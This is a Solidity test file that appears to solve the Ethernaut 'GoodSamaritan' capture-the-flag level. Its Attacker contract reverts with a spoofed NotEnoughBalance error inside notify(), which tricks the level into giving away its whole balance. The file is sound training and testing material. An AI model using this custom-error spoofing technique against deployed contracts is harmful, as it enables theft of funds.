// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest-08.sol";
import "src/levels/GoodSamaritan.sol";
import "src/levels/GoodSamaritanFactory.sol";

contract TestGoodSamaritan is BaseTest {
    GoodSamaritan private level;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = new GoodSamaritanFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = GoodSamaritan(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        Attacker attacker = new Attacker();
        attacker.attack(level);

        vm.stopPrank();
    }
}

contract Attacker is INotifyable {
    error NotEnoughBalance();

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function attack(GoodSamaritan _level) public {
        _level.requestDonation();
    }
}
